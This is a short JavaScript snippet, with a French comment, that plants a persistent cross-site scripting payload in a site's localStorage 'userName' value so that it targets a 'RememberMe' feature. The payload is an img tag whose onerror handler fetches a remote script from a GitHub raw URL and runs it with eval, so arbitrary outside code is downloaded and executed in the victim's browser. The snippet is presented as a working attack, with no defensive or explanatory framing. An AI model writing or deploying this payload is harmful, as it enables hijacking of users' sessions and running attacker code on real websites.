// 1. Persistance dans localStorage pour RememberMe XSS
localStorage.setItem('userName', `"><img src=x onerror="fetch('https://raw.githubusercontent.com/Vault-of-Jok3r/payload_xss/refs/heads/main/newpayload.js').then(r=>r.text()).then(c=>eval(c))">`);
